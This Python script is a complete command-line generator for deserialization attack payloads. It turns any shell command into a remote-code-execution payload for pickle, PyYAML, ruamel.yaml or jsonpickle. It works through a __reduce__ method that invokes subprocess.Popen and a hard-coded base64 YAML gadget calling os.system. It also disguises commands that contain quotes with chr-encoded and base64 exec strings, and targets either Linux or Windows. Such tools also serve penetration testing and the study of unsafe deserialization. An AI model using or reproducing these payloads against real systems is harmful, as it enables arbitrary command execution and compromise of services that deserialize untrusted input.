import argparse
import pickle
import jsonpickle
import yaml
import subprocess
from copy import deepcopy
from base64 import b64encode, b64decode

class Gen(object):
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return subprocess.Popen, (self.payload,)

class Payload(object):
    def __init__(self, c, location, base, os):
        self.location = location
        self.base = base
        self.os = os
        self.prefix = '' if self.os == 'linux' else "cmd.exe /c "
        self.cmd = self.prefix + c
        self.payload = b''
        self.quotes = "\'" in self.cmd or "\"" in self.cmd

    def pick(self):
        self.payload = pickle.dumps(Gen(tuple(self.case().split(" "))))
        self.payload = self.verify_encoding()
        self.saving_file("_pick")

    def ya(self):
        if self.quotes:
            self.payload = b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0g"
                                     "cHl0aG9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKHN0cihfX2ltcG9ydF9fKCdiY"
                                     "XNlNjQnKS5iNjRkZWNvZGUoJw==") + b64encode(bytes(self.cmd, 'utf-8')) + \
                           b64decode("JykuZGVjb2RlKCkpKSI=")
        else:
            self.payload = bytes(yaml.dump(Gen(tuple(self.cmd.split(" ")))), 'utf-8')
        self.payload = self.verify_encoding()
        self.saving_file("_yaml")

    def js(self):
        self.payload = bytes(jsonpickle.encode(Gen(tuple(self.case().split(" ")))), 'utf-8')
        self.payload = self.verify_encoding()
        self.saving_file("_jspick")

    def __add__(self, other):
        return self + other

    def verify_encoding(self):
        return b64encode(self.payload) if self.base else self.payload

    def saving_file(self, suffix):
        if self.location:
            open(self.location + suffix, "wb").write(self.payload)
        else:
            print(self.payload.decode('utf-8'))

    def chr_encode(self, data):
        d = '+'.join(['chr('+str(ord(ii))+')' for ii in data])
        return d

    def case(self):
        cmd = deepcopy(self.cmd)
        if self.quotes:
            cmd = self.prefix + "python -c exec({})".format(self.chr_encode(
                "__import__('os').system(__import__('base64').b64decode({}).decode('utf-8'))".
                format(b64encode(bytes(self.cmd, 'utf-8')))))
        return cmd 

def main():
    parser = argparse.ArgumentParser(description="Python Deserialization attack payload file generator.")
    parser.add_argument("command", help="RCE command")
    parser.add_argument("-o", "--output", help="File location to save output")
    parser.add_argument("--base64", action="store_true", help="Base64 encode payload")
    parser.add_argument("--os", choices=["linux", "windows"], default="linux",
                        help="Operating system of the target (default: linux)")
    parser.add_argument("--module", choices=["pickle", "pyyaml", "ruamel.yaml", "jsonpickle", "all"],
                        default="pickle", help="Select Module (default: pickle)")

    args = parser.parse_args()

    p = Payload(args.command, args.output, args.base64, args.os)
    function_dict = {"pickle": p.pick, "pyyaml": p.ya, "ruamel.yaml": p.ya, "jsonpickle": p.js}

    if args.module == "all":
        for i in function_dict.keys():
            function_dict[i]()
    elif args.module in function_dict.keys():
        function_dict[args.module]()

if __name__ == "__main__":
    main()
